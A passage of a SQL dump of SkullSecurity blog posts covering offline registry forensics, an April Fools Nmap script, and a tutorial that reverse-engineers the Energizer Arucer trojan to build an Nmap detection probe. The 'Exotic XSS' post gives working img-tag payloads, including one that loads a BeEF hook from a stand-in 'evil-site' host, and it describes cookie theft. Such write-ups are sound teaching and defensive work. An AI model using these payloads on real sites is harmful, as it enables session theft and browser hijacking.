cross-site scripting lined up. \nOtherwise, keep reading. Or just look at the pictures.\n\nStep 1: Get the registry hive\nThis step is pretty simple. The file is called software and is located in %SYSTEMROOT%\\system32\\config. You\'re going to have problems if you try grabbing this file from a running system, but fortunately we have an offline version of the harddrive. Copy that file to a USB stick, or some other device, following your standard evidence collection policies. I also recommend working from an image, not the live drive, if you\'re doing actual forensic work. \n\nStep 2: Import the hive\nFirst, run regedit on the analysis machine (that you copied the software file to):\n\nNext, click on the HKEY_LOCAL_MACHINE hive (or any other, really):\n\nNext, under the File menu, click \"Load Hive...\":\n\nNavigate to the \'software\' file that you copied from the target machine:\n\nWhen prompted, type in a name - it doesn\'t matter what:\n\nAnd that\'s it! Now you\'ll have the registry mounted as the name you gave it under HKEY_LOCAL_MACHINE:\n\nStep 3: Find the key\nThe key is located in HKEY_LOCAL_MACHINE/<thenameyoupicked>/Microsoft/Windows NT/CurrentVersion:\n\nAny key you want related to the version of Windows is right there. In my screenshot, we\'re running Windows XP Service Pack 2. The Owner and Company given during installation is shown there too, if you\'re into that. \nStep 4: Unmount\nIf you don\'t unmount the device, you\'ll get file-in-use errors until you do. So, click on the hive and under the File menu, select \"Unload Hive...\":\n\nDone!\nThat\'s it! Once you learn how to mount the registry from the offline machine, it\'s actually pretty easy. \nIf you know of a better way to do it, let me know! Comments and registration should once again work, assuming you an do simple math, or you can find my email address at the right somewhere. \nThanks for reading!', '\'Forensics\'', 'https://blog.skullsecurity.org/2010/find-the-windows-version-offline');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (64, 'Exotic XSS: The HTML Image Tag', 'Matt Gardenghi', '2010-4-6', 'There are the usual XSS tests.  And then there are the fun ones.  This is a story about a more exotic approach to testing XSS....\nI was testing a company that had passed all XSS tests from their pentester.  I found that they allowed users to write HTML tags.  Of course they didn\'t permit <script> tags or <iframe> tags.  (Well, they did allow those, but that was an oops - no server side filtering.)  This company had whitelisted a variety of \"safe\" tags for use by clients.\nThat\'s boring, right?  Heh, thanks to Ron, I had a way to abuse their whitelist.  (I\'ve since found this in Web Application Hackers Handbook, but I seem to have overlooked it at the time I read it.)  Three HTML 4 tags in particular allow javascript to be run from one of the elements and these are: <img>, <object>, and <style>.\n\nYou are really unlikely to see <object> and <style> tags permitted, but <img> tags are a bit more common.  Note: since my work on this site, I\'ve seen RSnake\'s page and other pages that talk about using <img src=\"alert(\'XSS\')\">.  That was nice in the past, but none of my current version browsers will execute that.  (Makes me wonder if the whole tracking image thing from emails of yesteryear still works, but that\'s a rabbit trail.  If you know, post a comment.)  Still, just because I can\'t source the javascript, doesn\'t mean I can\'t execute javascript....  We\'ll use different HTML 4 elements.\nNow, in my scenario, I decided to input <img src=\"blah.jpg\" onerror=\"alert(\'XSS\')\"/> and reloaded the page.  BINGO! I got a popup box.  This also works and has the advantage of a working image: <img src=\"realimage.png\" onload=\"alert(\'XSS\')\"/>.\nThat\'s cool.  It\'s really easy to check that off on your list and say \"vulnerable to XSS.\"  But, can you do anything besides popping boxes?  Doing something would be useful.  I had a question about all this, \"will these elements support more than an alert box or is this a useless novelty?\"  More tests were in order.\nSo, then we could replace alert() with document.write() and write the cookie to our server. This swipes cookies and that\'s better than a popup.  But why stop there?\nWhy not create a <script> on the page itself?  What\'s that you say?  <script> isn\'t on the whitelist?  So, your point?  If your browser creates the <script> locally, it can\'t be filtered, now can it?\nThanks to Mak (@mak_kolybabi) for giving me some of the tips I needed to get this going in the correct direction.\nHow about we try this:\n<img onload=\"var s = document.createElement(\'script\'); s.src=\'http://evil-site/beef/hook/beefmagic.js.php\';document.getElementsByTagName(\'head\')[0].appendChild(s);\" src=\"real_image.jpg\" />\nWe have a image that triggers the onload element.  Now we tell the browser to create a script element.  You may not be able to write <script>, but you are able to write the word \"script.\"  The createElement function tells the browser to create the <script></script>.  It\'s local to the client and the server has no idea.  :-D\nThen we give the source element (what else would you use but BeEF?) and then we place our new element into the page.  Viola! You\'ve just turned a simple <img> tag into stored XSS....\nI have noticed that using onload=\"local_function(),\" IE8 and FF3.6 have \"issues.\"  Not sure what it is quite yet.\nI spent a few moments looking around to see if I could locate websites that allow you to use HTML tags.  From a cursory perspective, Slashdot is safe, so is Digg, and most forums are now using BB Code.  So, how useful is this?  I\'d wager it\'s probably a last resort. If you chained attacks you could potentially use it.  Suppose you bypassed the front line of defense (like so) in a manner that allowed you to write tags, but ran into some sort of whitelist filtering on the server preventing <script> tags.  Now you have a way to create script tags while evading the filter.\nWe\'re not done yet....\nNow, you might think that all of this is trivial and not very important.  I mean seriously, who allows users to write tags at all?  Let\'s look forward for a moment.  HTML5 is coming.  According to this site (and I have to think that they would know), we find this beautiful bit of information: all event handlers must be supported by all elements, or something like that.  And there are a bunch of new event handlers.\nIn other words, not only do we have access to onload/onerror in every element, we get lots more....  Stored XSS will be everywhere for years.  All these wannabe web guys who implement the cool new whizbang HTML5 as soon as it ships, will be running huge risks unless they carefully filter out event handlers.  (At least they need to prevent users from implementing event handlers.)  We\'ve seen how well this has worked in the past, so my hopes for reasonably secure implementation are exactly nonexistent.\nAnd if you have a site that you want to allow users to write tags, try switching to BB Code.  It\'s safer.  Well, in 10 minutes of testing I didn\'t see how to bypass it as it doesn\'t support anything.  :-D\nCurrently, I am developing a page that will test a browser\'s support of HTML 5 action events.  If you have suggestions or tips, send them my way.  I\'m currently muddling through my coding.\nOh and just think about what would happen if someone accidentally on purpose managed to rewrite the <img> element on www.digg.com or www.google.com.  Would anyone ever notice?  How long would it take to find it?  Seriously, looking for a compromise, who\'d look at the official logo for the infection?  Enjoy your nightmares people.\nCheers.', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/exotic-xss-the-html-image-tag');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (65, 'Nmap script to generate custom license plates', 'Ron Bowes', '2010-4-1', 'Hey all,\nIn honour of this special day, I\'m releasing an Nmap script I wrote a few months ago as a challenge: http-california-plates.nse. To install it, ensure you\'re at the latest svn version of Nmap (I fixed a bug in http.lua last night that prevented this from working, so only the svn version as of today will work), download http-california-plates.nse, and install it.\n\nTo use it, you run Nmap as usual, against any server and any ports, the http-california-plates script, and a special script argument called \'plate\'. \'plate\' can be two to seven characters, and the script will validate whether or not it\'s a valid plate in California, and whether or not it\'s already being used! \nHere is what you can expect to see if a plate isn\'t available:\n$ nmap -p22 localhost --script=http-california-plates --script-args=plate=abcdef\r\n\r\nStarting Nmap 5.30BETA1 ( http://nmap.org ) at 2010-04-01 08:27 CDT\r\nNSE: Script Scanning completed.\r\nNmap scan report for localhost (127.0.0.1)\r\nHost is up (0.0011s latency).\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n\r\nHost script results:\r\n|_http-california-plates: Plate is not available!\r\n\nAnd here\'s what you see if a plate IS available:\n$ ./nmap --script=http-california-plates --script-args=plate=inscure -p22 localhost\r\n\r\nStarting Nmap 5.30BETA1 ( http://nmap.org ) at 2010-04-01 08:31 CDT\r\n[...]\r\n\r\nHost script results:\r\n|_http-california-plates: Plate is available!\r\n\nNever again will you have to spend your valuable seconds finding the California DMV\'s online tool for checking!\nHow\'s it work?\nThis script is dead simple -- it just makes three HTTP requests to a site. The first one is a simple GET request to this page:\nhttps://xml.dmv.ca.gov/IppWebV3/initPers.do\nThis page is simply generates the session cookie, which is saved. The second request is a POST to here (I\'m adding the arguments as GET to save space):\nhttps://xml.dmv.ca.gov/IppWebV3/processPers.do?imageSelected=plateMemorial.jpg&vehicleType=AUTO&isVehLeased=no&plateType=R\nFinally, the actual license plate it sent:\nhttps://xml.dmv.ca.gov/IppWebV3/processConfigPlate.do?kidsPlate=&plateType=R&plateLength=7&plateChar0=A&plateChar1=B&...\nAnd the response is parsed for success, failure, or error message. \nDone! \nHappy April Fool\'s :)', '\'April Fools\', \'Humour\', \'Nmap\'', 'https://blog.skullsecurity.org/2010/nmap-script-to-generate-custom-license-plates');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (66, 'Comments should work again!', 'Ron Bowes', '2010-3-28', 'So, I realized that the reCAPTCHA plugin for WordPress sucks was marking a lot of comments as spam, when it was actually working and not getting timeout errors (thanks to my egress filtering). I decided to toss it out and go with a math-based CAPTCHA for posts, so you should once again be able to post comments reliably! I\'m hoping that by customizing the math CAPTCHA to use different field names/numbers, it should eliminate the same amount of spam that reCAPTCHA did. \nAlso worth noting: at the moment, registration isn\'t going to work because I don\'t have email set up. I\'ll post an update to that when it\'s going again. It shouldn\'t matter, though, registration isn\'t required to comment. \nI also added an infobox on the side (-->) with information about the author of the post, since I\'ve been taking turns with my buddy Matt Gardenghi lately. Now you can see who posted what. \nIf anything isn\'t working, or you\'d like some feature/widget/whatever that I don\'t currently have, let me know! \nRon', '\'Default\'', 'https://blog.skullsecurity.org/2010/comments-should-work-again');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (67, 'Taking apart the Energizer trojan – Part 4: writing a probe', 'Ron Bowes', '2010-3-25', 'Now that we know what we need to send and receive, and how it\'s encoded, let\'s generate the actual packet. Then, once we\'re sure it\'s working, we\'ll convert it into an Nmap probe! In most of this section, I assume you\'re running Linux, Mac, or some other operating system with a built-in compiler and useful tools (gcc, hexdump, etc). If you\'re on Windows, you\'ll probably just have to follow along until I generate the probe.\n\nSections\nThis tutorial was getting far too long for a single page, so I broke it into four sections:\n\nPart 1: setup\nPart 2: runtime analysis (windbg)\nPart 3: disassembling (ida)\nPart 4: generating probes (nmap)\n\nGenerating probes\nRecall that packets are encoded by XORing each byte with 0xE5, and decoded the same way. That\'s great for us -- a simple program can encode and decode packets. Let\'s write it!\nI chose to write this in C because it\'s one of my favourite languages and the code needed to XOR every byte is trivial:\n\n#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    int c;\n    while((c = getchar()) != EOF)\n        printf(\"%c\", c ^ 0xE5);\n    return 0;\n}\n\nThat\'ll read characters from standard in, XOR them with 0xE5, then write them to standard out. Now we can compile it and run some test data through it (I called it the clever name, \'test\'):\nron@ankh:~$ vim test.c\r\nron@ankh:~$ gcc -o test test.c\r\nron@ankh:~$ echo \"this is a test\" | ./test | hexdump -C\r\n00000000  91 8d 8c 96 c5 8c 96 c5  84 c5 91 80 96 91 ef     |....Å..Å.Å....ï|\r\n0000000f\r\nron@ankh:~$ \nThat looks just about right! But if you count the characters, you\'ll see that we have one extra one: 0xEF. 0xEF is an encoded newline -- oops! We don\'t want newlines, but we DO want to null terminate the string. Running the echo with -n (no newline), -e (use character escapes), and adding \\x00 to the end will take care of that:\nron@ankh:~$ echo -ne \"this is a test\\x00\" | ./test | hexdump -C\r\n00000000  91 8d 8c 96 c5 8c 96 c5  84 c5 91 80 96 91 e5     |....Å..Å.Å....å|\r\n0000000f\r\nron@ankh:~$ \nThere we go! Now we need make a proper probe out of our string. Recall the string we found earlier:\n\nAs we know, it\'s 0x27 bytes long including the null terminator (that\'s what was passed to strcmpi()). So, we echo the string, with the 4-byte length in front and the 1-byte terminator at the end:\necho -ne \"\\x27\\x00\\x00\\x00{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}\\x00\"\nIn theory, that packet should provoke a response from the Trojan. Let\'s try it out:\n$ echo -ne \"\\x27\\x00\\x00\\x00{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}\\x00\" |\r\n  ./test | # encode it\r\n  ncat 192.168.1.123 7777 | # send it\r\n  ./test # decode the response\r\n(response)\r\nYES\r\n\nSuccess! The Trojan talked to us, and it said \"YES\". Now all we have to do is create an Nmap probe!\nNote that I am using an Nmap probe here rather than a script. Scripts are great if you need something with some intelligence or that can interact with the service, but in reality we\'re just sending a static request and getting a static response back. If somebody wants to take this a step further and write an Nmap script that interacts with this Trojan and gets some useful data from the system, that\'d be good too -- it always feels better to the user when they see evidence that something\'s working.\nAnyways, the first step to writing an Nmap probe is to find the nmap-service-probes file. It\'ll likely be in /usr/share/nmap or /usr/local/share/nmap or c:\\program files\\nmap. Where ever it is, open it up and scroll to the bottom. Add this probe (if it isn\'t already there):\n##############################NEXT PROBE##############################\r\n# Arucer backdoor\r\n# http://www.kb.cert.org/vuls/id/154421\r\n# The probe is the UUID for the \'YES\' command, which is basically a ping command, encoded\r\n# by XORing with 0xE5 (the original string is \"E2AC5089-3820-43fe-8A4D-A7028FAD8C28\"). The\r\n# response is the string \'YES\', encoded the same way.\r\nProbe TCP Arucer q|\\xC2\\xE5\\xE5\\xE5\\x9E\\xA0\\xD7\\xA4\\xA6\\xD0\\xD5\\xDD\\xDC\\xC8\\xD6\\xDD\\xD7\\xD5\\xC8\\xD1\\xD6\\x83\\x80\\xC8\\xDD\\xA4\\xD1\\xA1\\xC8\\xA4\\xD2\\xD5\\xD7\\xDD\\xA3\\xA4\\xA1\\xDD\\xA6\\xD7\\xDD\\x98\\xE5|\r\nrarity 8\r\nports 7777\r\n\r\nmatch arucer m|^\\xbc\\xa0\\xb6$| p/Arucer backdoor/ o/Windows/ i/**BACKDOOR**/\r\n\nSo basically, we\'re sending a probe equal to the packet we just sent on port 7777. If it comes back with the encoded \'YES\', then we mark it as \'Infected\'. Go ahead, give it a try:\n$ nmap -sV -p7777 192.168.1.123\r\n\r\nStarting Nmap 5.21 ( http://nmap.org ) at 2010-03-22 21:42 CDT\r\nNmap scan report for 192.168.1.123\r\nHost is up (0.00020s latency).\r\nPORT     STATE SERVICE VERSION\r\n7777/tcp open  arucer  Arucer backdoor (**BACKDOOR**)\r\nService Info: OS: Windows\r\n\r\nService detection performed. Please report any incorrect results at http://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 12.61 seconds\r\n\nIt successfully detected the Arucer backdoor! Woohoo!\nConclusion\nSo, to wrap up, here\'s what we did:\n\nExecute the Trojan in a contained environment\nAttach a debugger to the Trojan and learn how recv() is called\nGet the callstack from the recv() call\nDisassemble the Trojan to learn how it works\nFind the addresses we saw on the callstack\nDetermine how the simple crypto works (XOR with 0xE5)\nDetermine what we need to XOR with 0xE5 (\"{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}\")\nDetermine what we can expect to receive (\"YES\" XORed with 0xE5)\nWrite an Nmap probe to make it happen\n\nKeep in mind that most malicious software isn\'t quite this easy. Normally there\'s some kind of protection against debugging, reverse engineering, virtualizing, etc. Don\'t think that after reading this tutorial, you can grab yourself a sample of Conficker and go to town on it. If you do, you\'re in for a lot of pain. :)\nAnyway, I hope you learned something! Feel free to email me (my address is on the right), twitter me @iagox86, or leave a comment right here.', '\'Malware\', \'Nmap\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2010/taking-apart-the-energizer-trojan-part-4-writing-a-probe');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (68, 'Taking apart the Energizer trojan – Part 3: disassembling', 'Ron Bowes', '2010-3-25', 'In Part 2: runtime analysis, we discovered some important addresses in the Energizer Trojan -- specifically, the addresses that make the call to recv() data. Be sure to read that section before reading this one. \nNow that we have some starting addresses, we can move on to a disassembler and look at what the code\'s actually doing. Fortunately, the author made no attempt to disguise the code or pack or or anything like that, so a simple disassembler is all we need to examine the code.\nA word of warning: this is the longest, most complicated section. But stick with it, by the end we\'ll know exactly how the Trojan ticks!\n\nSections\nThis tutorial was getting far too long for a single page, so I broke it into four sections:\n\nPart 1: setup\nPart 2: runtime analysis (windbg)\nPart 3: disassembling (ida)\nPart 4: generating probes (nmap)\n\nDisassembly -- from the top\nIf you haven\'t already, install IDA somewhere. This part is safe and doesn\'t have to be on your sacrificial system, but you probably won\'t be able to do this on any system with antivirus installed. Any antivirus program will delete the Trojan before you have a chance to disassemble it. \nFirst off, fire up IDA and load the arucer.dll file (I included it in the same archive as the installer; get it here (password is \"infected\", as always be careful when handling live malware); alternatively, navigate to c:\\Windows\\System32 on the infected machine and grab it).\n\nWhen IDA comes up, it\'ll ask you what you want to do. Hit \"New\":\n\nWhen prompted, hit \"PE Executable\" and then \"OK\" -- in theory, you can probably pick something more appropriate but it auto-detects anyways.\n\nThen, navigate to the path where you extracted Arucer.dll and choose it (you may need to change the \"Files of type\" dropdown to \"all files\":\n\nAfter selecting it, you\'ll be prompted with a bunch of questions. Like installing software, just keep hitting \'next\' until it stops asking you questions. Eventually, it\'ll be loaded up and you\'ll be presented with a screen full of assembly. Feel free to customize it how you like; I generally turn off the main menu bar and maximize the sub-windows.\nThe first thing I like to do when looking at malware, and it\'s because I was bitten by this once on a contest, is hit the \"Exports\" tab and see what it can do:\n\nOn the Trojan, we can see there are two exports -- \"DllEntryPoint\", which every .dll file has, and \"Arucer\". If you follow DllEntryPoint, you won\'t get anywhere. It sets some variables, that\'s about it. But if you double-click on Arucer, we can see where the actual Trojan does its work:\n\nThe first thing we see here is a call to CreateMutexA() with the name \"liuhong-061220\". Liu Hong, eh? The author, perhaps? Why would somebody writing an actual Trojan put his name in it? That brings back the question of whether this was intended to be a Trojan at all, or just a misguided feature?\nAfter the mutex is created, a call to CreateThread() is made. If you double-click on StartAddress (the address that\'s called when the thread starts):\n\nYou\'ll see a simple loop:\n\nThe code calls sub_10001D80 then jumps back to the line that calls sub_10001D80. This is an infinite loop. So double-click on sub_10001D80 and look around. You\'ll see that, among other things, a call is made to listen():\n\nThat tells us that we\'re definitely on the right track! If you keep going, you\'ll eventually make it to the same recv() function that we already found using the debugger.\nAt this point, feel free to look around a little bit, see if you can understand a little about what\'s going on. The biggest key is the system functions being called (like accept(), listen(), recv(), etc) -- they tell you what\'s going on more than anything else.\nDisassembly -- from the bottom\nIn the last section, we followed the code execution from the beginning of the program to the listen() and accept() calls, which lead to the recv() and send(). That\'s one way to skin this catcarrot, but, since we already learned some useful addresses from the debugger, let\'s start at one of them: 0x100011aa. \nThroughout this section, feel free to explore. I\'m posting screenshots and addresses for everything I talk about, so you can always hit \"g\" (for \"go\") and catch up. You can also press \"escape\" at any time to jump back to the last place you were. \n0x100011aa is one of the addresses we found while debugging; it\'s the address that called recv(). In IDA, hit \"g\" and type it in. You\'ll find yourself in the middle of a function, right after a call to recv(). Scroll up and find the top of the function (sub_10001180), which will look like this:\n\nThe first thing to note is that this function takes three arguments. The second and third were discovered by IDA to be \'buf\' and \'len\', which refer to the buffer and length being passed to the recv() call -- the only recv() arguments we\'re missing are the socket and the flags. \nWe\'re going to try and figure out what the first argument is. if you click on \"arg_0\" in the list of local variables, you\'ll see that three lines into the function it\'s moved to \'ebx\'. If you click on \'ebx\', you\'ll see that, a little later, the value it points to is moved to eax:\n\nIf you click on \'eax\', you\'ll see that it\'s pushed last (and, therefore, is the first argument) to recv(), and, as the automatically generated comment tells you, that\'s the \'s\' (socket) parameter:\n\nSo now that we know what\'s going on, we can name the variables properly. Go to the top of sub_10001180 again, click on the name, and press \"y\" to define the function. Change the first argument to \"int *socket\":\n\nIf you scroll around the function, you\'ll see that all it really does is recv() some data into the buffer. Therefore, it\'s a wrapper around recv(). Click on the function name again (\"sub_10001180\") and press \"n\" to change the name. Type in something you\'ll remember; I\'ll be using \"recv_wrapper\":\n\nOne trick here is that this function does a little more than recv(). If you scroll a little past the recv() call to loc_100011D2, you\'ll see a little loop:\n\nThis loop moves a byte from \'esi\' to the \'bl\' register, XORs the byte with 0xE5, then puts the byte back into \'esi\'. Then it decrements ecx and loops as long as ecx is non-zero. Even without knowing what the different registers are doing here, it\'s pretty obvious what\'s going on -- every byte in the string is being XORed with 0xE5. That\'s a weak encoding, but it\'s definitely enough to keep out prying eyes.\nScrolling down a bit further, you\'ll find the end of the recv_wrapper() function. Because this function is called from a lot of different places (scroll up and click on the recv_wrapper declaration and press ctrl-x to find out where), the easiest way of finding the caller is to go back to our stacktrace from the debugger; in that stacktrace, the next address was 0x10001624.\nNaturally, the first thing you\'ll see at 0x10001624 is, on the previous line, the call to recv_wrapper(). But looking above it, we only see one argument -- the socket -- being passed to it:\n\nTo find the other arguments, you\'ll have to scroll way up to 0x10001575. There you\'ll see the length (4) and the buffer (eax), which points at a local variable called, at the moment, \"len\":\n\nSo now we know that exactly 4 bytes are being received. Thinking back to my Battle.net days, that sounds like a packet header -- typically, the header will contain the length of the packet, then that many more bytes are received.\nNow, if you scroll down a little more past the recv_wrapper() call, to line 0x10001659, you\'ll find a second recv_wrapper() -- we can guess that it\'s probably downloading the rest of the packet. The length being passed is \'eax\' which, as you can see on line 0x10001639, is set to the buffer from the previous call to recv_wrapper():\n\nThat\'s good -- we expected the first recv_wrapper() call to return the length. The \'buf\' argument is also set to the same buffer as the previous call, which was called \"len\":\n\nNow that we know it isn\'t specifically used for the length, since both recv_wrapper() calls use it as a buffer. To avoid confusion, we should rename it. Click on \"len\" and press \"n\" for \"name\", and type \"buffer\" or \"buf\":\n\nAll right, so now we\'ve received a header and a body. But what happens to the body? Let\'s have a look:\n\nTo explain the flow a little: shortly after the call to recv_wrapper(), a call is made to memicmp(). The arguments passed to memicmp() are:\n\n\'eax\', which is the buffer from the recv_wrapper() call -- in other words, the data that was just received (not including the length)\n\'edx\', which is a local variable, var_828 -- we\'ll look more into var_828 shortly\n0x27, or 39, for the length -- keep this value in mind, we\'re going to need it\n\nAs for the var_828, click on it and scroll wayyyy up till you see where it\'s set, right at the top of this function:\n\n\'esi\' (the source register) is set to a static string that just happens to be 38 characters long -- 39 including the string terminator. The same length that was passed to memicmp() -- the important part to remember here is that the string terminator is included in the comparison. That\'s important. Also, keep this string in mind -- we\'re going to need it while writing our probe. \n\'edi\' (the destination register) is set to var_828. Then \'rep movsd\' is executed. \'rep movsd\' basically moves data from \'esi\' (source) to \'edi\' (destination), \'ecx\' times. In short, it copies that big long string into var_828.\nJumping back down to the memicmp() (0x10001697), the next instruction is a jump-if-not-zero. Since memicmp() returns 0 when strings match, it\'ll fall through if the data matches our long string:\n\nI realize that\'s a lot to take in, but we\'re almost done. Let\'s summarize what we\'ve seen so far:\n\nA 4-byte header -- the length -- is recv()\'ed from the client\nThe rest of the message, as defined by the length, is recv()\'ed from the client\nThe received bytes are XORed with 0xE5\nThe bytes are compared to a 38-character string, \"{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}\"\nIf it matches, ...well, let\'s talk about that. \n\nIf you scroll a little bit past the memicmp() call, you\'ll see a call to sub_100011F0 (at 0x100016C6). The only thing left after that call is a return, so that call has to be important:\n\nThis function has three arguments: \'esi\', \'eax\', and \"3\". \'esi\', if you scroll up far enough, is the socket. So what are the other two?\nIf you look up a few lines to 0x100016AC, you\'ll see that eax is set to the buffer where the received data was going. After a few more lines, the \'cx\' register, which is set to a value at word_1000405C, is put into \'buffer\' (\'cx\' is a 2-byte register):\n\nLikewise, the third byte in \"buffer\" is set to \'dl\', which is set to byte_1000405E a few lines above (\'dl\' is a 1-byte register):\n\nSo the first three bytes in the buffer are set from static memory addresses, via the 2-byte register \'cx\' and the 1-byte register \'dl\'. Now we need to determine what values these two registers had been set to. \nTo figure out what the values of \'cx\' and \'dl\' are, double-click on one of them. You\'ll be brought to 0x1000405C, which should look like this:\n\nIf you\'ve looked at enough hex, you\'ll immediately recognize these three values on ascii. Click on each of them, then select Edit->Operand type->Character (or just press \"R\"):\n\nYou\'ll see that these three bytes are actually, \'EY\' and \'S\', which, because of little endian, is actually \'YE\' and \'S\' -- \'YES\'!\n\nHit \"esc\" to go back (or press \"g\" and type 0x1000169F) and, if you\'d like, add comments saying what the values are (use \";\" or shift-\";\" to add comments):\n\nSo, three bytes, \"YES\", are placed in \"buffer\" and passed to a function, along with the socket and the number \"3\" -- the length. It\'s pretty safe to assume that this function is the send_wrapper(). Double click on it to find out!\nNear the top of the send_wrapper() function (sub_100011F0), you\'ll see another little loop:\n\nThe array is being XORed with 0xE5. Next, we\'ll see what we\'re looking for:\n\nsend()! Now we know -- if we send a 4-byte length followed by the 38-byte string (\"{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}\") and a null terminator, encoded by XORing it with 0xE5, we should receive a 3-byte response (\"YES\"), also encoded by XORing with 0xE5.\nSo, in this section we followed the flow of data from the recv() function, which we found with a debugger, to the send() function. We were fortunate that the first type we found was a simple ping -- I send it data, and it replies with \"YES\". It\'s safe, doesn\'t change the state, has a static request, and a static response. Perfect!\nIn Part 4: generating probes, the final section, we\'ll actually put the pen to paper (err, characters to harddrive? code to monitor?) and write a probe that implements this ping request.', '\'Malware\', \'Nmap\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2010/taking-apart-the-energizer-trojan-part-3-disassembling');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (69, 'Taking apart the Energizer trojan – Part 2: runtime analysis', 'Ron Bowes', '2010-3-25', 'In Part 1: setup, we infected the system with the Trojan. It should still be running on the victim machine. If you haven\'t read that section, I strongly recommend you go back and read it. \nNow that we\'ve infected a test machine, the goal of this step is to experiment a little with the debugger and learn a little about the Energizer Trojan. This can all be discovered with a simple disassembler, but I find it more fun to take apart a live sample. All we\'re going to do is add a breakpoint at the recv() function and see where it\'s called from.\nThis step is going to require Debugging Tools for Windows. If you haven\'t installed it already, install it on the victim machine.\n\nSections\nThis tutorial was getting far too long for a single page, so I broke it into four sections:\n\nPart 1: setup\nPart 2: runtime analysis (windbg)\nPart 3: disassembling (ida)\nPart 4: generating probes (nmap)\n\nRuntime Analysis\nRun \"windbg\"; then, under the \"File\" menu, choose \"Attach to a Process\" (or press F6):\n\nNavigate the list and find \"rundll32.exe\":\n\nIf you aren\'t sure if it\'s the right one, expand it with the \"+\" and validate that it\'s running \"Arucer.dll\":\n\nOnce you hit \"OK\", the debugger will attach to the Trojan process and suspend it, waiting for your actions. It\'ll look something like this:\n\nAll we want to do is add a breakpoint on the \"recv\" function. \"recv\" is a function in Winsock that reads data from the network. Since this Trojan is listening on a port, it\'ll likely try to receive data from anything that connects to it. In the command window of Windbg, type \"bp recv\":\n\nTo validate that the breakpoint was successfully created, you can run the \"bl\" command (\"breakpoint list\"), which will print all breakpoints that have been set on this process:\n\nNow that we\'ve set a breakpoint on recv() and verified that it exists, resume the Trojan process by clicking the \"Resume\" button (or press F5, or type \"g<enter>\"):\n\nYou\'ll note that nothing happens right away. And unless something tries to connect to the host on port 7777, nothing is going to happen. The reason is that the Trojan is sitting on the accept() call, waiting for a connection. Obviously, if we want to trigger the recv() call, we have to connect to it. So, open up a new command prompt (\"cmd.exe\") and telnet to localhost port 7777:\n\nAs soon as you do that, the accept() call finishes and the Trojan attempts to receive some data, hitting our breakpoint:\n\nThe process is once again suspended and waiting for us to do something.  You can have some fun at this point and poke around, but first run the \"k\" command, which is short for \"call stack\" -- it\'ll tell us who called recv(), who called that function, and so on:\n\nMake note of the two addresses here -- 0x100011aa and 0x10001624 -- we\'ll be using those later. 0x100011aa is the place where recv() was called, and 0x10001624 is the place where that function was called.\nThat brings us to the end of the runtime analysis. We now know the call path that leads up to the recv(), and can work our way backwards to find out what kind of data it wants to receive.\nAt this point, feel free to play around in the debugger and see what you can learn. The first thing I usually do is tell the recv() function to return using Debug->Step Out and look at how it processes the data -- make sure you type something in the console for it to receive first.\nWhen you\'re all done, restart the process so we can test later:\n\nThen run it:\n\nIn the next section, Part 3: disassembling, we\'ll look at the code that makes the Trojan tick.', '\'Malware\', \'Nmap\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2010/taking-apart-the-energizer-trojan-part-2-runtime-analysis');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (70, 'Taking apart the Energizer trojan – Part 1: setup', 'Ron Bowes', '2010-3-25', 'Hey all,\nAs most of you know, a Trojan was recently discovered in the software for Energizer\'s USB battery charger. Following its release, I wrote an Nmap probe to detect the Trojan and HDMoore wrote a Metasploit module to exploit it.\nI mentioned in my last post that it was a nice sample to study and learn from. The author made absolutely no attempt to conceal its purpose, once installed, besides a weak XOR encoding for communication. Some conspiracy theorists even think this may have been legitimate management software gone wrong -- and who knows, really? In any case, I offered to write a tutorial on how I wrote the Nmap probe, and had a lot of positive feedback, so here it is!\nJust be sure to take this for what it is. This is *not* intended to show any new methods or techniques or anything like that. It\'s a reverse engineering guide targeted, as much as I could, for people who\'ve never opened IDA or Windbg in their lives. I\'d love to hear your comments!\n\nSections\nThis tutorial was getting far too long for a single page, so I broke it into four sections:\n\nPart 1: setup\nPart 2: runtime analysis (windbg)\nPart 3: disassembling (ida)\nPart 4: generating probes (nmap)\n\nStep 0: You will need...\nTo follow along, you\'ll need the following (all free, except for Windows itself):\n\nA disposable Windows computer to infect (probably on VMWare)\nDebugging Tools for Windows (I used 6.11.1.404)\nIDA (free)\nNmap\nA basic understanding of C and x86 assembly would be an asset. <shamelessplug>Check out the reverse engineering guide I wrote</shamelessplug>\nA basic understanding of the Linux commandline (gcc, pipes, etc)\n\nInfect a test machine\nThe goal of this step is, obviously, to infect a test system with the Energizer Trojan.\nStrictly speaking, this isn\'t necessary. You can do a fine job understanding this sample without actually infecting yourself. That being said, this Trojan appears to be fairly safe, as far as malware goes, so it\'s a good one to play with. I strongly recommend against installing this on anything other than a throwaway computer (I used VMWare). Do not install this on anything real. Ever. Seriously!\nIf you\'re good and sure this is what you really want to do, grab the file here:\n\nThen extract the installation file, UsbCharger_setup_v1_1_1.exe (arucer.dll isn\'t necessary yet). The password for the zip archive is \"infected\", and by typing it in you promise to understand the risks of dealing with malware:\n\nNaturally, make sure you turn off antivirus software before extracting it. In fact you shouldn\'t even be running antivirus because your system shouldn\'t even be connected to the network!\nPerform a typical install (ie, hit \'next\' till it stops asking you questions). Once you\'ve finished the installation, verify that the backdoor is listening on port 7777 by running \"cmd.exe\" and running \"netstat -an\":\n\nCongratulations! 